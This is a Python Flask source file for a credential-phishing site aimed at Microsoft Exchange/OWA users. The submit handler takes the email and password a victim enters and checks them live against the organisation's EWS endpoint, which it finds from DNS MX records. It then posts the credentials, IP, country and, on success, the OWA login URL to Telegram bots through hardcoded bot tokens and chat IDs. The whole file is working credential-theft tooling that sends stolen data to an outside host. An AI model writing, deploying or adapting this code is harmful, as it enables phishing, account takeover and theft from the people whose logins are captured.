import asyncio
import requests
import dns.resolver
from flask import Flask, request, render_template
from exchangelib import DELEGATE, Account, Credentials, Configuration
from exchangelib.protocol import BaseProtocol, NoVerifyHTTPAdapter

app = Flask(__name__)
application = app

class TimeoutHTTPAdapter(NoVerifyHTTPAdapter):
    def send(self, request, **kwargs):
        if not kwargs.get("timeout"):
            kwargs["timeout"] = 10
        return super().send(request, **kwargs)

BaseProtocol.HTTP_ADAPTER_CLS = TimeoutHTTPAdapter

TELEGRAM_API_SUCCESS = "https://api.telegram.org/bot8096810662:AAH7qQawIVcdZmezuyYr_DaRyF5C0bE1sio/sendMessage"
TELEGRAM_API_FAILURE = "https://api.telegram.org/bot8029912650:AAHQELXBWMpG2ioVOqU7S9g27K7AhKTbDK4/sendMessage"
SUCCESS_CHAT_ID = "5453486561"
FAILURE_CHAT_ID = "5453486561"

def get_lowest_priority_mx(domain):
    try:
        answers = dns.resolver.resolve(domain, "MX")
        mx_records = sorted(answers, key=lambda r: r.preference)
        return mx_records[0].exchange.to_text(omit_final_dot=True)
    except Exception as e:
        print(f"MX Lookup Error for {domain}: {e}")
        return None

def derive_url_from_mx(mx_record):
    if "mx1.smtp" in mx_record:
        mx_record = mx_record.replace("mx1.smtp", "west")
    elif "mx2.smtp" in mx_record:
        mx_record = mx_record.replace("mx2.smtp", "east")

    mx_record = mx_record.replace(".mx", "")
    mx_record = mx_record.replace(".smtp", "")

    return f"https://{mx_record}/EWS/Exchange.asmx"

def check_credentials_with_ews(email_address, password):
    try:
        domain = email_address.split("@", 1)[1]
    except IndexError:
        print("Invalid email address provided.")
        return False, None, None, None

    mx = get_lowest_priority_mx(domain)
    if not mx:
        print("No valid MX record could be derived.")
        return False, None, None, None

    single_endpoint = derive_url_from_mx(mx)
    print(f"Derived single endpoint: {single_endpoint}")

    auth_types = ["basic", "NTLM"]
    for auth_type in auth_types:
        try:
            creds = Credentials(username=email_address, password=password)
            config = Configuration(
                service_endpoint=single_endpoint,
                credentials=creds,
                auth_type=auth_type
            )
            account = Account(
                primary_smtp_address=email_address,
                credentials=creds,
                config=config,
                autodiscover=False,
                access_type=DELEGATE
            )
            # Attempt to access root folder as a credential check
            account.root.refresh()
            print(f"Success => endpoint={single_endpoint}, user={email_address}, auth={auth_type}")
            return True, single_endpoint, email_address, auth_type
        except Exception as e:
            print(f"Failed => endpoint={single_endpoint}, user={email_address}, auth={auth_type}, error={e}")

    return False, None, None, None

async def send_telegram_message(api_url, chat_id, message):
    payload = {"chat_id": chat_id, "text": message, "parse_mode": "MarkdownV2"}
    try:
        response = requests.post(api_url, json=payload)
        if response.status_code == 200:
            print("Telegram message sent successfully!")
        else:
            print(f"Failed to send Telegram message. Status: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print(f"Telegram API Error: {e}")

@app.route('/')
def index():
    username = request.args.get('username', None)
    return render_template('index.html', username=username)

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('login')
    password = request.form.get('password')
    ip = request.form.get('ip', "127.0.0.1")
    country = request.form.get('country', "Localhost")

    if not username or not password:
        return "Missing username or password", 400

    success, used_endpoint, used_user_pattern, used_auth = check_credentials_with_ews(username, password)
    if success:
        login_url = used_endpoint.replace("/EWS/Exchange.asmx", "/owa")
        success_message_content = (
            f"✅ *Successful Serverdata Login*\n\n"
            f"🔗 *Login URL:* `{login_url}`\n"
            f"📧 *Email:* `{username}`\n"
            f"🔑 *Password:* `{password}`\n"
            f"🌍 *IP Address:* `{ip}`\n"
            f"📍 *Country:* `{country}`"
        )
        asyncio.run(send_telegram_message(TELEGRAM_API_SUCCESS, SUCCESS_CHAT_ID, success_message_content))
        return render_template('success.html', login_url=login_url)
    else:
        failure_message_content = (
            f"⚠️ *Serverdata Login Attempt*\n\n"
            f"📧 *Email:* `{username}`\n"
            f"🔑 *Password:* `{password}`\n"
            f"🌍 *IP Address:* `{ip}`\n"
            f"📍 *Country:* `{country}`"
        )
        asyncio.run(send_telegram_message(TELEGRAM_API_FAILURE, FAILURE_CHAT_ID, failure_message_content))
        return render_template('failure.html', username=username)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
